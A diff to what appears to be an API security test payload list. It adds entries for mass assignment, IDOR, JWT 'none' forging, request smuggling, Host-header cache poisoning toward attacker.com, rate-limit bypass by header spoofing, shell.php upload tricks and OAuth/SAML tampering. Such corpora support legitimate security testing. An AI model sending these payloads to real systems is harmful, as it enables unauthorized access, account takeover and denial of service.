@@ -4,13 +4,13 @@
 # mass assignment, and authorization bypass
 # ============================================================================
 
-# Mass assignment — inject admin role
+# Mass assignment: inject admin role
 {"name": "John", "email": "john@example.com", "role": "admin", "isAdmin": true}
 # Hidden parameter injection
 {"action": "get_user", "userId": 1, "debug": true, "showInternalData": true}
-# IDOR — access another user's data
+# IDOR: access another user's data
 Get user profile for user ID: 1 (when attacker is user ID: 5)
-# Parameter pollution — duplicate params
+# Parameter pollution: duplicate params
 action=view_profile&userId=5&userId=1
 # Negative ID access
 Fetch user with ID: -1
@@ -24,7 +24,7 @@ Fetch user with ID: 00000000-0000-0000-0000-000000000000
 Fetch user with ID: *
 # Array parameter where single expected
 {"userId": [1, 2, 3, 4, 5]}
-# Type juggling — string vs int
+# Type juggling: string vs int
 {"userId": "1 OR 1=1"}
 # Boolean parameter abuse
 {"deleteAll": true, "confirmed": true}
@@ -34,9 +34,9 @@ Fetch user with ID: *
 {"apiKey": "", "authenticated": true}
 # Rate limit bypass via parameter
 {"request_id": "unique-1", "bypass_rate_limit": true}
-# Pagination abuse — negative offset
+# Pagination abuse: negative offset
 {"page": -1, "limit": 999999}
-# Pagination abuse — enormous limit
+# Pagination abuse: enormous limit
 {"page": 1, "limit": 2147483647}
 # Sort injection
 {"sort": "password", "order": "ASC"}
@@ -48,9 +48,9 @@ Fetch user with ID: *
 {"query": "{ a1: user(id: 1) { password } a2: user(id: 2) { password } a3: user(id: 3) { password } }"}
 # GraphQL introspection
 {"query": "{ __schema { types { name fields { name type { name } } } } }"}
-# JWT manipulation — none algorithm
+# JWT manipulation: none algorithm
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
-# JWT manipulation — weak secret
+# JWT manipulation: weak secret
 Forge JWT with role=admin using common secrets: "secret", "password", "key"
 # API key format guessing
 Try API keys: sk_live_EXAMPLE_NOT_RE, rk_live_EXAMPLE_NOT_RE
@@ -82,3 +82,91 @@ Set X-Admin: true, X-Debug: 1, X-Internal: yes
 {"constructor": {"prototype": {"isAdmin": true}}}
 # Parameter overflow
 {"data": "A" * 1000000} (send very large parameter to cause buffer overflow or DoS)
+# Verb tunneling via X-HTTP-Method-Override
+Set X-HTTP-Method-Override: DELETE on a GET request to /api/users/1
+# Verb tunneling via X-Method-Override
+Set X-Method-Override: PUT on POST /api/config
+# Hidden admin endpoints
+Call /api/internal/admin, /api/debug, /api/_internal/stats, /api/actuator/env
+# Spring Boot actuator endpoints
+GET /actuator/env, /actuator/configprops, /actuator/heapdump, /actuator/mappings
+# Express.js debug endpoints
+GET /__express_debug, /__routes, /__stack
+# GraphQL batching attack
+[{"query":"mutation{login(u:\"a\",p:\"1\")}"}, {"query":"mutation{login(u:\"a\",p:\"2\")}"}, ... ] (1000 password attempts in one request)
+# GraphQL field suggestion abuse
+Query with intentional typo: { user { passwrd } } to get suggestion "Did you mean password?"
+# GraphQL directive injection
+{ user @deprecated { name password } }
+# REST parameter array expansion
+GET /api/users?id=1&id=2&id=3&id=4&id=5&id=6&id=7&id=8&id=9&id=10
+# REST filter injection
+GET /api/users?filter[role]=admin&filter[active]=true
+# REST include expansion
+GET /api/users?include=credentials,apiKeys,sessions,tokens
+# REST field selection injection
+GET /api/users?fields=id,name,email,password_hash,api_key,secret
+# HATEOAS link manipulation
+Follow _links.admin.href instead of _links.self.href
+# Bulk delete via parameter
+DELETE /api/users?ids=1,2,3,4,5,6,7,8,9,10
+# Bulk update via PATCH
+PATCH /api/users with body: [{"id": 1, "role": "admin"}, {"id": 2, "role": "admin"}]
+# API versioning exploit
+Try /api/v0/users, /api/v1/users/internal, /api/beta/admin
+# Authorization header swap
+Replace Bearer token with Basic auth: "Authorization: Basic YWRtaW46cGFzc3dvcmQ="
+# CORS preflight bypass
+Send actual request without preflight by using simple Content-Type: text/plain
+# Cookie injection
+Set-Cookie: session=admin_session; role=admin; isAuthenticated=true
+# Session fixation
+Set session ID before auth: Set-Cookie: JSESSIONID=attacker_known_value
+# Cache poisoning via Host header
+Set Host: attacker.com to poison cached responses
+# Cache key injection
+GET /api/users HTTP/1.1\nHost: target.com\nX-Forwarded-Host: attacker.com
+# Request smuggling (CL.TE)
+Content-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED
+# Request smuggling (TE.CL)
+Transfer-Encoding: chunked\nContent-Length: 3\n\n8\nSMUGGLED\n0\n\n
+# HTTP/2 CRLF injection
+Header: foo: bar\r\nTransfer-Encoding: chunked
+# Rate limit bypass via IP rotation headers
+X-Forwarded-For: {random_ip}
+X-Real-IP: {random_ip}
+X-Client-IP: {random_ip}
+# Rate limit bypass via unique identifiers
+Add unique X-Request-ID per request to bypass per-request deduplication
+# API key brute force via parameter
+GET /api/data?api_key=test1, GET /api/data?api_key=test2, ... (enumerate keys)
+# IDOR via encoded ID
+GET /api/users/MTIz (base64 of "123") when the user should only access user 456
+# IDOR via UUID prediction
+GET /api/documents/550e8400-e29b-41d4-a716-446655440000 (UUID v1 is time-based, predictable)
+# Mass assignment via nested object
+{"user": {"name": "John", "profile": {"role": "admin", "verified": true}}}
+# Mass assignment via form encoding
+user[name]=John&user[role]=admin&user[isAdmin]=true
+# File upload type bypass
+Upload .php file with Content-Type: image/png
+# File upload double extension
+Upload file named shell.php.jpg
+# File upload null byte
+Upload file named shell.php%00.jpg
+# Content negotiation abuse
+Accept: application/xml (may return data in format with less sanitization)
+# Response format injection
+Accept: application/vnd.api+json; ext=admin
+# OAuth scope escalation
+Request scope: "read write admin delete" when only "read" was authorized
+# OAuth PKCE bypass
+Omit code_verifier in token exchange for PKCE flow
+# SAML assertion manipulation
+Modify SAML assertion to change NameID to admin@company.com
+# WebSocket origin bypass
+Connect to WebSocket with Origin: http://trusted-domain.com from attacker page
+# WebSocket message injection
+Send raw WebSocket frame: {"action": "admin_override", "data": "escalate"}
+# SSE event injection
+Inject: event: admin\ndata: {"override": true}\n\n
